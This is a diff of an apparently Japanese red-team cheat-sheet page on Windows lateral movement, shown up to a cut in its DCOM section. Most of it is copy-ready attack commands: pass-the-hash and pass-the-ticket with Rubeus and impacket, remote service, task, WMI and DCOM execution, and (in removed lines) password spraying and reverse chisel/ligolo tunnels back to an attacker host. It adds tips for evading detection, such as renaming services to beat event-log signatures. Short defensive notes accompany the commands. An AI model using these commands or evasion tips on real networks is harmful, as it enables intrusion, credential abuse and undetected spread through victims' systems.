@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Lateral Movement — d0me</title>
-<meta name="description" content="横展開の索引。認証情報の再利用・リモート実行(WinRM/WMI/SMB)・トンネリングとピボット、そして検知。">
+<meta name="description" content="横展開 — framework-非依存の lateral primitive、credential × transport マトリクス、pivot topology の判断、non-domain / cross-platform 境界越えの実践リファレンス。">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -26,139 +26,1022 @@
   <div class="wrap">
     <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Lateral Movement</div>
     <h1>Lateral Movement</h1>
-    <p class="lede">一台の掌握を面へ広げる。認証情報の再利用、リモート実行、そして到達不能なセグメントへのトンネリング。すべてラボ想定・プレースホルダ。
-      <span class="jp">前提: あるホストで管理者権限、または再利用可能な資格情報/ハッシュを保持。</span></p>
+    <p class="lede">Framework-agnostic lateral primitives — credential × protocol × execution matrix, pivot topology decisions, and non-domain / cross-platform boundary crossing.<span class="jp">認証・プロトコル・実行の三軸で lateral primitive を整理し、pivot 経路の判断と non-domain / cross-platform 境界越えまで扱う。framework 経由の primitive は <a href="command-control.html">command-control</a>、Kerberos exploit 本体は <a href="ad-compromise.html">ad-compromise</a> を参照。</span></p>
   </div>
 </section>
 
 <div class="wrap">
-<div class="sheet-layout">
+<section class="attack-flow">
+  <div class="flow-head">
+    <span class="hx">##</span>
+    <span class="fl-label">Lateral Kill-Chain</span>
+    <span class="fl-jp">横展開の判断フロー</span>
+    <span class="rt">click each phase to jump →</span>
+  </div>
+  <div class="flow-chain">
+    <a class="flow-phase" href="#s01"><span class="p-num">P1</span><span class="p-title">Credential</span><span class="p-jp">認証材料</span><span class="p-techs">NT / AES / TGT / TGS / cert / cleartext</span></a>
+    <a class="flow-phase" href="#s02"><span class="p-num">P2</span><span class="p-title">Protocol</span><span class="p-jp">プロトコル選定</span><span class="p-techs">SMB / RPC-DCOM / WinRM / RDP / MSSQL / SSH</span></a>
+    <a class="flow-phase" href="#s03"><span class="p-num">P3</span><span class="p-title">Execution</span><span class="p-jp">実行トリガ</span><span class="p-techs">Service / WMI / DCOM / Task / PSRemoting / xp_cmdshell</span></a>
+    <a class="flow-phase" href="#s10"><span class="p-num">P4</span><span class="p-title">Pivot Topology</span><span class="p-jp">経路設計</span><span class="p-techs">SOCKS / TUN / port-forward / double-pivot</span></a>
+    <a class="flow-phase" href="#s08"><span class="p-num">P5</span><span class="p-title">Boundary</span><span class="p-jp">境界越え</span><span class="p-techs">non-domain / cross-platform / trust hop</span></a>
+  </div>
+</section>
+</div>
 
+<div class="wrap">
+<div class="sheet-layout">
   <aside class="toc">
     <div class="toc-label">目次</div>
     <ul>
-      <li><a href="#creds">01 認証情報の再利用</a></li>
-      <li><a href="#exec">02 リモート実行</a></li>
-      <li><a href="#tunnel">03 トンネリング</a></li>
-      <li><a href="#pivot">04 ピボット設計</a></li>
-      <li><a href="#ref">05 参照</a></li>
+      <li><a href="#s01">01 Auth Material</a></li>
+      <li><a href="#s02">02 SMB Execution</a></li>
+      <li><a href="#s03">03 RPC / DCOM</a></li>
+      <li><a href="#s04">04 WinRM / PSRemoting</a></li>
+      <li><a href="#s05">05 RDP Lateral</a></li>
+      <li><a href="#s06">06 Kerberos Transport</a></li>
+      <li><a href="#s07">07 MSSQL Lateral</a></li>
+      <li><a href="#s08">08 Non-domain</a></li>
+      <li><a href="#s09">09 Cross-platform</a></li>
+      <li><a href="#s10">10 Pivot Topology</a></li>
+      <li><a href="#s11">11 Detection &amp; Hardening</a></li>
+      <li><a href="#ref">12 References</a></li>
     </ul>
   </aside>
 
   <article class="doc">
 
-    <section id="creds" class="reveal">
-      <h2><span class="num">01</span>認証情報の再利用<span class="jp">reuse</span></h2>
-      <p>横展開の燃料は使い回された資格情報。平文・NT ハッシュ・Kerberos チケットのいずれで動くかを整理する。</p>
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Auth Material Preparation<span class="jp">認証材料の準備</span></h2>
+      <p>lateral の起点は credential の <em>format</em>。credential 取得の手順は <a href="ad-compromise.html">ad-compromise</a> が本文、こちらは <strong>取得済み material を lateral の transport に載せられる形に変換・注入する</strong> 手順に絞る。credential × transport の対応表が本 sheet 全体の判断基盤。</p>
 
-      <h3>スプレー(まず面を測る)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 1組の資格情報がどのホストで管理者か</span>
-nxc smb <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>'
-<span class="c"># (Pwn3d! 表示 = ローカル管理者)</span></code></pre></div>
+      <h3 id="cred-matrix">credential × transport 対応表</h3>
+      <table>
+        <thead><tr><th>credential</th><th>SMB</th><th>WinRM</th><th>RDP</th><th>DCOM/RPC</th><th>MSSQL</th></tr></thead>
+        <tbody>
+          <tr><td>NT hash</td><td><code>PTH</code></td><td>制約あり</td><td><code>Restricted Admin</code> 前提</td><td><code>PTH</code></td><td>Windows auth のみ</td></tr>
+          <tr><td>AES256</td><td>OverPTH 後</td><td>OverPTH 後</td><td>OverPTH 後</td><td>OverPTH 後</td><td>OverPTH 後</td></tr>
+          <tr><td>TGT (.kirbi/ccache)</td><td><code>PTT</code></td><td><code>PTT</code></td><td><code>PTT</code></td><td><code>PTT</code></td><td><code>PTT</code></td></tr>
+          <tr><td>TGS (service ticket)</td><td>service 一致で可</td><td>SPN 要 <code>HTTP/</code></td><td>SPN 要 <code>TERMSRV/</code></td><td>SPN 要 <code>host/</code></td><td>SPN 要 <code>MSSQLSvc/</code></td></tr>
+          <tr><td>PKINIT cert</td><td>PKINIT → TGT → 上と同じ</td><td>同左</td><td>同左</td><td>同左</td><td>同左</td></tr>
+          <tr><td>cleartext</td><td>可</td><td>可</td><td>可</td><td>可</td><td>可</td></tr>
+        </tbody>
+      </table>
+      <p>WinRM が NT hash で通らないのは既定で Negotiate → Kerberos 優先が効くため。Kerberos-only 環境では NT hash から OverPTH で TGT を作ってから初めて WinRM が通る。RDP の Restricted Admin は target 側 registry の設定に依存(<a href="#s05">s05</a>)。</p>
 
-      <h3>Pass-the-Hash</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NT ハッシュでそのまま認証</span>
-nxc smb <span class="v">&lt;TARGET&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -H '<span class="v">&lt;NTHASH&gt;</span>'
-psexec.py -hashes :<span class="v">&lt;NTHASH&gt;</span> \
-  <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;USER&gt;</span>'@<span class="v">&lt;TARGET&gt;</span></code></pre></div>
+      <h3 id="ntlm-to-tgt">NT hash → TGT (OverPTH の準備)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Rubeus で TGT を取得。/nowrap は Base64 の 76 桁改行を抑止して copy 用に整形</span>
+Rubeus.exe asktgt /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NT&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /nowrap
 
-      <h3>Pass-the-Ticket</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ccache を環境変数に設定して Kerberos で認証</span>
-export KRB5CCNAME=<span class="v">&lt;TICKET&gt;</span>.ccache
-psexec.py -k -no-pass <span class="v">&lt;TARGET.FQDN&gt;</span></code></pre></div>
+<span class="c"># AES256 が取れているなら rc4 より Kerberoast 検知に引っかかりにくい</span>
+Rubeus.exe asktgt /user:<span class="v">&lt;USER&gt;</span> /aes256:<span class="v">&lt;AES&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /nowrap
+
+<span class="c"># /ptt で現在の LUID に注入(=以降のプロセスで Kerberos が使える)</span>
+Rubeus.exe asktgt /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NT&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /ptt</code></pre></div>
+
+      <h3 id="tgt-to-tgs">TGT → TGS (service ticket 要求)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 事前に TGT を PTT 済みの前提</span>
+Rubeus.exe asktgs /service:cifs/<span class="v">&lt;TARGET_FQDN&gt;</span> /nowrap
+Rubeus.exe asktgs /service:http/<span class="v">&lt;TARGET_FQDN&gt;</span> /nowrap    <span class="c"># WinRM 用</span>
+Rubeus.exe asktgs /service:mssqlsvc/<span class="v">&lt;TARGET_FQDN&gt;</span>:1433 /nowrap
+
+<span class="c"># TGT を直接指定して TGS 発行 (LUID 注入なし、file 出力)</span>
+Rubeus.exe asktgs /service:cifs/<span class="v">&lt;TARGET_FQDN&gt;</span> /ticket:<span class="v">&lt;TGT_B64&gt;</span> /outfile:tgs.kirbi</code></pre></div>
+
+      <h3 id="ptt">Pass-the-Ticket (PTT — ticket 注入)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># ファイルからそのまま注入</span>
+Rubeus.exe ptt /ticket:tgt.kirbi
+
+<span class="c"># Base64 文字列から直接注入</span>
+Rubeus.exe ptt /ticket:<span class="v">&lt;B64&gt;</span>
+
+<span class="c"># 特定の LUID に注入 (別ユーザ context に載せる、要 SeTcbPrivilege 相当)</span>
+Rubeus.exe ptt /ticket:<span class="v">&lt;B64&gt;</span> /luid:<span class="v">&lt;LUID_HEX&gt;</span>
+
+<span class="c"># 新しい netonly プロセスに注入 (現 LUID を汚染しない、最も安全)</span>
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
+<span class="c">#   -&gt; 出力される LUID を控えて</span>
+Rubeus.exe ptt /ticket:<span class="v">&lt;B64&gt;</span> /luid:<span class="v">&lt;NEW_LUID&gt;</span>
+
+<span class="c"># 現行 session の TGT を抽出 (delegation なし、要昇格)</span>
+Rubeus.exe tgtdeleg /nowrap</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span><code>createnetonly</code> は S4U2Self 要らずで別 identity の netonly プロセスを作れる。<code>/show</code> で得た LUID に PTT すれば、その cmd.exe から出る Kerberos 通信のみが偽装 identity になり、operator 側の現行 session は汚さない。ラボと engagement のどちらでも第一選択にすべき pattern。</div>
+
+      <h3 id="linux-ccache">Linux 側の ticket 取り扱い (ccache)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux 側で TGT を直接取得 (KDC への KRB_AS_REQ を送る)</span>
+impacket-getTGT <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+<span class="c">#   -&gt; &lt;USER&gt;.ccache が生成される</span>
+
+<span class="c"># AES256 で取得 (rc4 downgrade を避けたい環境向け)</span>
+impacket-getTGT <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span> -aesKey <span class="v">&lt;AES&gt;</span>
+
+<span class="c"># ccache を environment variable として設定 (以降の impacket ツールが自動で読む)</span>
+<span class="k">export</span> KRB5CCNAME=<span class="v">&lt;USER&gt;</span>.ccache
+klist                                       <span class="c"># 中身を確認</span>
+
+<span class="c"># -k -no-pass で Kerberos 認証。/etc/krb5.conf の realm 設定が必須</span>
+impacket-psexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span>
+impacket-wmiexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span>
+smbclient -k //<span class="v">&lt;TARGET_FQDN&gt;</span>/c$</code></pre></div>
+
+      <h3 id="kirbi-ccache">kirbi ↔ ccache 相互変換</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows で取った .kirbi を Linux の ccache に変換</span>
+impacket-ticketConverter <span class="v">&lt;INPUT&gt;</span>.kirbi <span class="v">&lt;OUTPUT&gt;</span>.ccache
+
+<span class="c"># 逆方向 (Linux 側で使っている ccache を Windows 側で PTT したい)</span>
+impacket-ticketConverter <span class="v">&lt;INPUT&gt;</span>.ccache <span class="v">&lt;OUTPUT&gt;</span>.kirbi
+
+<span class="c"># 中身の確認 (SPN / 有効期限 / 暗号種別)</span>
+impacket-describeTicket <span class="v">&lt;INPUT&gt;</span>.ccache</code></pre></div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>ローカル管理者パスワードを LAPS で個別化し、PtH の横展開連鎖を断つ。</li>
-          <li>Protected Users / Credential Guard でメモリ上の資格情報露出を抑制。</li>
-          <li>同一アカウントの短時間・多ホストログオン(4624 type 3/9)を相関検知。</li>
+          <li><strong>Protected Users group</strong>: RC4 と NTLM を無効化、TGT 寿命 4h、Kerberos delegation 対象外。lateral 用の high-value account を必ず入れる。</li>
+          <li><strong>AES-only Kerberos</strong>: GPO で <code>Network security: Configure encryption types allowed for Kerberos</code> から RC4 を外す。rc4 asktgt が失敗するようになり overpass-the-hash が塞がる。</li>
+          <li><strong>4648 (explicit credential logon)</strong> を全 DC / member で有効化。<code>createnetonly</code> と <code>runas /netonly</code> の trace として恒久有効。</li>
+          <li><strong>TGT lifetime を短縮</strong> (既定 10h → 4h) で盗まれた ticket の消費期限を縮める。domain policy の Kerberos Policy から。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>lateral の第一質問は「どの credential format を持っているか」。format が決まれば transport の選択肢が自動で絞られる。</li>
+          <li><code>createnetonly</code> + PTT は operator の現行 LUID を汚染しない、事故率が最も低い注入パターン。</li>
+          <li>Linux 側から Kerberos 認証するときは KRB5CCNAME + <code>-k -no-pass</code>。/etc/krb5.conf の realm と FQDN が必須。</li>
         </ul>
       </div>
     </section>
 
-    <section id="exec" class="reveal">
-      <h2><span class="num">02</span>リモート実行<span class="jp">remote exec</span></h2>
-      <p>実行チャネルは検知プロファイルが異なる。SMB サービス生成は目立ち、WinRM は正規運用に紛れやすい。到達性と静粛性で選ぶ。</p>
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>SMB-based Execution<span class="jp">SMB 経由の実行</span></h2>
+      <p>SMB (445/tcp) は最も歴史があり、最も監視されている lateral 経路。同じ SMB でも <strong>実行トリガの違い</strong>(Service Create / Task Scheduler / SMBExec) で残る痕跡が変わる。framework 経由は <a href="command-control.html#s10">command-control s10</a>、こちらは impacket / native binary の raw primitive に絞る。</p>
+
+      <h3 id="psexec">Service-create pattern (PsExec / impacket-psexec)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket 版 (Linux から): SVCCTL 経由で service create → cmd をトリガ</span>
+impacket-psexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+impacket-psexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -k -no-pass       <span class="c"># Kerberos</span>
+
+<span class="c"># service 名を明示 (default は 8 文字 random で bloodhound 検知される)</span>
+impacket-psexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> -service-name BthAvctpSvc
+
+<span class="c"># nxc (旧 CrackMapExec) — 反復オペレーションはこちらが速い</span>
+nxc smb <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -x <span class="s">'whoami /all'</span>
+nxc smb <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -X <span class="s">'&lt;PS_CMD&gt;'</span>    <span class="c"># PowerShell 実行</span>
+
+<span class="c"># PsExec native binary (Windows→Windows)</span>
+PsExec.exe -accepteula \\<span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;DOMAIN&gt;</span>\<span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> -s cmd.exe
+
+<span class="c"># SCM 直叩き (痕跡最小化: service を明示制御)</span>
+sc.exe \\<span class="v">&lt;TARGET&gt;</span> create BthAvctpSvc binPath= <span class="s">"cmd.exe /c &lt;CMD&gt;"</span> start= demand
+sc.exe \\<span class="v">&lt;TARGET&gt;</span> start BthAvctpSvc
+sc.exe \\<span class="v">&lt;TARGET&gt;</span> delete BthAvctpSvc</code></pre></div>
+
+      <h3 id="atexec">Task Scheduler pattern (atexec / schtasks)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket-atexec — ATSVC 経由。EID 7045 は残らない</span>
+impacket-atexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> <span class="s">'whoami'</span>
+
+<span class="c"># native schtasks (Windows→Windows)</span>
+schtasks /create /s <span class="v">&lt;TARGET&gt;</span> /tn <span class="s">"Update"</span> /tr <span class="s">"cmd /c &lt;CMD&gt;"</span> /sc ONCE /st 00:00 /ru SYSTEM
+schtasks /run /s <span class="v">&lt;TARGET&gt;</span> /tn <span class="s">"Update"</span>
+schtasks /delete /s <span class="v">&lt;TARGET&gt;</span> /tn <span class="s">"Update"</span> /f</code></pre></div>
+
+      <h3 id="smbexec">SMBExec (semi-interactive shell)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># psexec と違い binary drop なし、service を一時作成して cmd の出力を SMB 共有経由で回収</span>
+impacket-smbexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+
+<span class="c"># service 名を default (BTOBTO) から変更</span>
+impacket-smbexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> -service-name UpdaterSvc</code></pre></div>
+
+      <h3 id="smb-hardening-matrix">SMB signing / EPA / SMBv1 の影響</h3>
       <table>
-        <thead><tr><th>手段</th><th>ポート</th><th>特徴</th></tr></thead>
+        <thead><tr><th>設定</th><th>PsExec</th><th>SMBExec</th><th>AtExec</th><th>SMB Relay</th></tr></thead>
         <tbody>
-          <tr><td>WinRM</td><td>5985/5986</td><td>正規運用に紛れやすい・対話向き</td></tr>
-          <tr><td>WMI</td><td>135 + 動的</td><td>サービス生成なし・比較的静か</td></tr>
-          <tr><td>SMB (psexec 系)</td><td>445</td><td>サービス生成で目立つ・確実</td></tr>
+          <tr><td>SMB signing 強制</td><td>可</td><td>可</td><td>可</td><td><strong>塞がる</strong></td></tr>
+          <tr><td>EPA 有効 (LDAPS/HTTPS)</td><td>影響なし</td><td>影響なし</td><td>影響なし</td><td>NTLM Relay 塞がる</td></tr>
+          <tr><td>SMBv1 無効</td><td>影響なし (v2+)</td><td>影響なし</td><td>影響なし</td><td>影響なし</td></tr>
+          <tr><td>Restricted Admin</td><td>NT hash 可</td><td>NT hash 可</td><td>NT hash 可</td><td>影響なし</td></tr>
         </tbody>
       </table>
 
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># WinRM 対話（ハッシュ可）</span>
-evil-winrm -i <span class="v">&lt;TARGET&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -H '<span class="v">&lt;NTHASH&gt;</span>'
-
-<span class="c"># WMI 実行（サービス生成なし）</span>
-wmiexec.py <span class="v">&lt;DOMAIN&gt;</span>/'<span class="v">&lt;USER&gt;</span>':'<span class="v">&lt;PASS&gt;</span>'@<span class="v">&lt;TARGET&gt;</span>
-
-<span class="c"># 一斉コマンド実行</span>
-nxc winrm <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>' -x 'whoami'</code></pre></div>
-
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
-          <li>管理チャネル(WinRM/WMI)を管理ホストからの JIT 接続に限定。</li>
-          <li>7045(サービスインストール)、4688(疑わしい親子: services.exe→cmd 等)を監視。</li>
-          <li>横方向の 445/5985 を微細セグメント化で制限。</li>
+          <li><strong>SMB signing required</strong> を全 member に強制 (GPO: <code>Microsoft network server: Digitally sign communications (always)</code>)。NTLM Relay の完封に効く。</li>
+          <li><strong>EID 7045</strong> (new service install) を SIEM で必ず拾う。特に binPath が <code>cmd.exe /c</code> や 8 文字 random 名の service 名は高精度で impacket-psexec を検知。</li>
+          <li><strong>EID 5145</strong> (detailed file share access) で <code>\\*\ADMIN$</code> と <code>\\*\C$</code> の access を audit。SMBExec の <code>\\*\C$\Windows\Temp\</code> への write もここに現れる。</li>
+          <li><strong>SeImpersonatePrivilege</strong> を持つ user を減らす。SeImpersonate があると service 経由の子プロセスから SYSTEM への便乗が容易 (<a href="evasion.html#s02">evasion s02</a> 参照)。</li>
         </ul>
       </div>
-    </section>
 
-    <section id="tunnel" class="reveal">
-      <h2><span class="num">03</span>トンネリング<span class="jp">到達性を作る</span></h2>
-      <p>掌握ホストを踏み台に、直接届かない内部セグメントへ経路を通す。代表的な選択肢は <code>ligolo-ng</code> と <code>chisel</code>。</p>
-
-      <h3>ligolo-ng(推奨・TUN ベース)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 攻撃側: proxy 起動 + インタフェース準備</span>
-sudo ip tuntap add user $USER mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert
-<span class="c"># ligolo> session → 内部サブネットを追加 → route</span>
-sudo ip route add <span class="v">&lt;INTERNAL_SUBNET&gt;</span> dev ligolo</code></pre></div>
-
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 掌握ホスト側で agent を実行</span>
-./agent -connect <span class="v">$LHOST</span>:11601 -ignore-cert</code></pre></div>
-
-      <h3>chisel(HTTP 上の TCP トンネル)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 攻撃側 server / 掌握側 client（reverse socks）</span>
-./chisel server -p 8080 --reverse
-./chisel client <span class="v">$LHOST</span>:8080 R:socks</code></pre></div>
-
-      <div class="note"><span class="lbl">tips</span>LHOST(tun0)は接続毎に変わる: <code>ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1</code></div>
-
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
-        <ul>
-          <li>egress を許可プロキシ経由に限定し、長時間持続する外向き TCP/TLS を異常として検知。</li>
-          <li>サーバ資産からの想定外の外向き接続(特に高ポート・自己署名 TLS)を監視。</li>
-        </ul>
-      </div>
-    </section>
-
-    <section id="pivot" class="reveal">
-      <h2><span class="num">04</span>ピボット設計<span class="jp">順序と静粛性</span></h2>
-      <ul>
-        <li><strong>測ってから動く</strong> — スプレーで管理者範囲を把握し、最短で価値ある資産へ。</li>
-        <li><strong>静粛性の順</strong> — WMI/WinRM → 必要時のみ SMB サービス系。痕跡の重いものは後段に。</li>
-        <li><strong>経路は最小限</strong> — 不要なトンネルを張らない。多層トンネルは遅延と検知面を増やす。</li>
-      </ul>
       <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
         <ul>
-          <li>横展開の起点は再利用資格情報。LAPS と Credential Guard がそのまま最大の対策になる。</li>
-          <li>実行チャネルは検知プロファイルで選ぶ。確実さ(SMB)と静粛さ(WMI/WinRM)はトレードオフ。</li>
-          <li>ピボットは「到達性の生成」。egress 監視が防御側の要で、TUN より HTTP トンネルの方が紛れやすい。</li>
+          <li>impacket-psexec は最も便利だが最も検知される。service 名を default random から変えるだけで EID 7045 の signature 検知率が下がる。</li>
+          <li>AtExec は EID 7045 を残さないので blue team の default rule を素通りしやすい。ただし EID 4698 (Scheduled Task created) は残る。</li>
+          <li>SMBExec は binary drop なしで stealth に見えるが、SMB 共有への読み書きが激しく EID 5145 で目立つ。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>RPC / DCOM Execution<span class="jp">RPC / DCOM 経由の実行</span></h2>
+      <p>Service を作らずに DCOM object の method 呼び出しで任意コマンドを起動する。EID 7045 が残らないため service-create 検知を素通りする一方、Sysmon の parent-child anomaly (<code>mmc.exe</code> → <code>cmd.exe</code> 等) には引っかかる。</p>
+
+      <h3 id="wmiexec">WMI Win32_Process.Create</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket-wmiexec — RPC/DCOM (135/tcp + dynamic) 経由。SMB session なしでも動く</span>
+impacket-wmiexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+
+<span class="c"># silent 一発 (semi-interactive shell を張らず単発コマンド)</span>
+impacket-wmiexec <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> <span class="s">'whoami /priv'</span>
+
+<span class="c"># nxc の wmi module (wmiexec + smbexec の代替)</span>
+nxc wmi <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -x <span class="s">'&lt;CMD&gt;'</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows native — wmic (deprecated だが多くの環境に残る)</span>
+wmic /node:<span class="v">&lt;TARGET&gt;</span> /user:<span class="v">&lt;DOMAIN&gt;</span>\<span class="v">&lt;USER&gt;</span> /password:<span class="v">&lt;PW&gt;</span> process call create <span class="s">"cmd.exe /c &lt;CMD&gt;"</span>
+
+<span class="c"># PowerShell の Invoke-WmiMethod (DCOM transport)</span>
+<span class="k">$cred</span> = Get-Credential
+Invoke-WmiMethod -ComputerName <span class="v">&lt;TARGET&gt;</span> -Class Win32_Process -Name Create -ArgumentList <span class="s">'cmd.exe /c &lt;CMD&gt;'</span> -Credential <span class="k">$cred</span>
+
+<span class="c"># Invoke-CimMethod (WSMan transport、WinRM 前提)</span>
+<span class="k">$s</span> = New-CimSession -ComputerName <span class="v">&lt;TARGET&gt;</span> -Credential <span class="k">$cred</span>
+Invoke-CimMethod -CimSession <span class="k">$s</span> -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=<span class="s">'&lt;CMD&gt;'</span>}</code></pre></div>
+
+      <h3 id="dcomexec">DCOM object abuse</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket-dcomexec — MMC20 / ShellWindows / ShellBrowserWindow を選べる</span>
+impacket-dcomexec -object mmc <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+impacket-dcomexec -object shellwindows <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span>
+impacket-dcomexec -object shellbrowserwindow <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># MMC20.Application を PowerShell から直接叩く</span>
+<span class="k">$com</span> = [Type]::GetTypeFromCLSID(<span class="s">"49B2791A-B1AE-4C90-9B8E-E860BA07F889"</span>, <span class="s">"&lt;TARGET&gt;"</span>)
+<span class="k">$obj</span> = [Activator]::CreateInstance(<span class="k">$com</span>)
+<span class="k">$obj</span>.Document.ActiveView.ExecuteShellCommand(<span class="s">"cmd.exe"</span>, <span class="k">$null</span>, <span class="s">"/c &lt;CMD&gt;"</span>, <span class="s">"7"</span>)
+
+<span class="c"># ShellWindows (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)</span>
+<span class="k">$com</span> = [Type]::GetTypeFromCLSID(<span class="s">"9BA05972-F6A8-11CF-A442-00A0C90A8F39"</span>, <span class="s">"&lt;TARGET&gt;"</span>)
+<span class="k">$obj</span> = [Activator]::CreateInstance(<span class="k">$com</span>)
+<span class="k">$item</span> = <span class="k">$obj</span>.Item()
+<span class="k">$item</span>.Document.Application.ShellExecute(<span class="s">"cmd.exe"</span>, <span class="s">"/c &lt;CMD&gt;"</span>, <span class="s">"C:\Windows\System32"</span>, <span class="k">$null</span>, 0)</code></pre></div>
+
